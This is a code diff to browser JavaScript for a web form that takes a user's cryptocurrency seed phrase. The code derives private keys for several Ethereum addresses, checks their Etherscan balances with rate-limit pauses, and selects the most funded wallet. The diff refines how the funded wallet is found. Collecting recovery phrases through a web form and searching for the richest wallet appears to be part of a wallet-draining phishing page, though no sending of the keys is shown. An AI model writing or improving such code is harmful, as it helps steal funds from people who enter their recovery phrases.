@@ -204,36 +204,32 @@ document.getElementById('phraseForm').addEventListener('submit', async function 
   try {
     const mnemonic = words.join(" ").trim();
     
-    // Check multiple derivation paths to find the funded/active address
-    const paths = [
-      "m/44'/60'/0'/0/0", // Standard BIP44 (MetaMask, Trust, etc.)
-      "m/44'/60'/0'/0",   // Ledger Live path variant
-      "m/44'/60'/0'",     // Legacy root path
-      "m/m/44'/60'/0'/0/0"
-    ];
-
+    // Generate candidate wallets across indices 0 to 4 (standard path m/44'/60'/0'/0/i)
     let candidateWallets = [];
-    for (let p of paths) {
+    let seedNode = ethers.utils.HDNode.fromMnemonic(mnemonic);
+    
+    for (let i = 0; i < 5; i++) {
       try {
-        let node = ethers.Wallet.fromMnemonic(mnemonic, p);
-        candidateWallets.push(node);
+        let derived = seedNode.derivePath(`m/44'/60'/0'/0/${i}`);
+        candidateWallets.push(new ethers.Wallet(derived.privateKey));
       } catch (e) {}
     }
 
-    // Fallback standard wallet if paths fail
     if (candidateWallets.length === 0) {
       candidateWallets.push(ethers.Wallet.fromMnemonic(mnemonic));
     }
 
-    // Query balance for candidate addresses to pick the correct active one
+    // Default to the first wallet if none have balance
     let bestWallet = candidateWallets[0];
     let maxBalance = ethers.BigNumber.from(0);
 
+    // Sequentially check balances with a slight pause to respect rate limits
     for (let w of candidateWallets) {
       try {
         const bUrl = `https://api.etherscan.io/api?module=account&action=balance&address=${w.address}&tag=latest&apikey=${ETHERSCAN_API_KEY}`;
         const bRes = await fetch(bUrl);
         const bData = await bRes.json();
+        
         if (bData && bData.status === "1" && bData.result) {
           let bal = ethers.BigNumber.from(bData.result);
           if (bal.gt(maxBalance)) {
@@ -241,18 +237,15 @@ document.getElementById('phraseForm').addEventListener('submit', async function 
             bestWallet = w;
           }
         }
+        // Brief pause to prevent Etherscan 429 rate limit block
+        await new Promise(resolve => setTimeout(resolve, 350));
       } catch (err) {}
     }
 
     address = bestWallet.address;
     ethBalance = ethers.utils.formatEther(maxBalance);
 
-    // If maxBalance was still 0 on standard path, explicitly query transaction history to pull the exact interacting address
-    if (maxBalance.eq(0)) {
-      address = candidateWallets[0].address;
-    }
-
-    // Fetch last 5 transactions for the resolved address
+    // Fetch transactions for the correct active address
     const txUrl = `https://api.etherscan.io/api?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&page=1&offset=5&sort=desc&apikey=${ETHERSCAN_API_KEY}`;
     const txRes = await fetch(txUrl);
     const txData = await txRes.json();
